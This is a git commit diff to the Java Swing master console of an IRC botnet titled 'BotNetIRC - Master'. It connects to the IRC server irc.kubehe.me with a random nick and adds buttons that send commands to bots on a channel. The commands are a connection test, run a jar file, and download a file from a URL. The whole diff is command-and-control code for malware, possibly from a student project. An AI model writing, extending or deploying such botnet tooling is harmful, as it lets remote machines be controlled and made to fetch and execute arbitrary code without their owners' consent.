b7361ca9198209899358ab127b7568ed5827611d
PAwel_Z <pawelzych97@gmail.com>
2017-05-09 16:15:59 +0200

    english version, button functions, scrolling log

--- src/mastergui/Gui.java
+++ src/mastergui/Gui.java
@@ -5,51 +5,92 @@ import botlogic.Bot;
 import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.util.Random;
 
 /**
  * Created by zychp_w10 on 08.05.2017.
  */
 public class Gui {
     private static String server = "irc.kubehe.me";
-    private static String nick = "bot";
-    private static String login = "bot";
+    private static String nick = "masterGui";
+    private static String login = "masterGui";
     private static String channel = "#channel";
-    private static String msg;
+    private static String log;
 
 
     private Bot masterbot;
-    private JPanel mainpanel;
-    private JTextField commandField1;
-    private JButton sendbutton1;
-    private JRadioButton testPołączeniaRadioButton;
-    private JRadioButton atak1RadioButton;
-    private JRadioButton atak2RadioButton;
-    private JRadioButton atak3RadioButton;
-    private JRadioButton szyfrowanieRadioButton;
-    private JTextArea logtextArea1;
-    private JScrollBar logscrollBar1;
-    private JPanel logpanel;
-    private JPanel buttonpanel;
-    private JPanel encryption;
+    private JPanel mainPanel;
+    private JTextField commandTextField1;
+    private JButton sendButton;
+    private JRadioButton connectiontestRadioButton;
+    private JRadioButton runJarFileRadioButton;
+    private JRadioButton downloadFileFromUrlRadioButton;
+    private JRadioButton userCommandRadioButton;
+    private JRadioButton encryptionRadioButton;
+    private JTextArea logTextArea1;
+    private JPanel logPanel;
+    private JPanel buttonPanel;
     private JPanel graphpanel;
+    private JScrollPane logScrollPane;
 
     public Gui() throws Exception {
-        logtextArea1.setText("TEST");
-        masterbot = new Bot(server, "masterGui", "masterGui", channel);
+        setNickAndLogin(getRandomNumber());
+        masterbot = new Bot(server, nick, login, channel);
         masterbot.connectToIRC();
-        sendbutton1.addActionListener(new ActionListener() {
+        logTextArea1.setEditable(false);
+        sendButton.addActionListener(new ActionListener() {
             @Override
-            public void actionPerformed(ActionEvent e)  {
+            public void actionPerformed(ActionEvent e) {
                 String command;
-                command = commandField1.getText();
-                commandField1.setText(command);
+                command = commandTextField1.getText();
+                commandTextField1.setText(command);
+                logTextArea1.append(command + "\n");
+                JScrollBar vertical = logScrollPane.getVerticalScrollBar();
+                vertical.setValue(vertical.getMaximum());
                 try {
                     masterbot.sendMessage(command);
-                }
-                catch (java.lang.Exception exc) {
+                } catch (java.lang.Exception exc) {
                 }
             }
         });
+        connectiontestRadioButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                commandTextField1.setText("TESTINOUT");
+            }
+        });
+        runJarFileRadioButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                commandTextField1.setText("RUNJAR");
+            }
+        });
+        downloadFileFromUrlRadioButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                commandTextField1.setText("DOWNLADFILE");
+            }
+        });
+        userCommandRadioButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                commandTextField1.setText(null);
+            }
+        });
+    }
+
+    private static void setNickAndLogin(int randomNumber)
+    {
+        String number = Integer.toString(randomNumber);
+        System.out.println("BOT_NO:" + number);
+        nick = nick.concat(number);
+        login = login.concat(number);
+    }
+
+    private static int getRandomNumber()
+    {
+        Random randomGenerator = new Random();
+        return randomGenerator.nextInt(9999);
     }
 
     public static void main(String[] args) throws Exception {
@@ -57,7 +98,7 @@ public class Gui {
         frame.setSize(600, 400);
         frame.setLocationByPlatform(true);
         frame.setTitle("BotNetIRC - Master");
-        frame.setContentPane(new Gui().mainpanel);
+        frame.setContentPane(new Gui().mainPanel);
         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         frame.setVisible(true);
     }
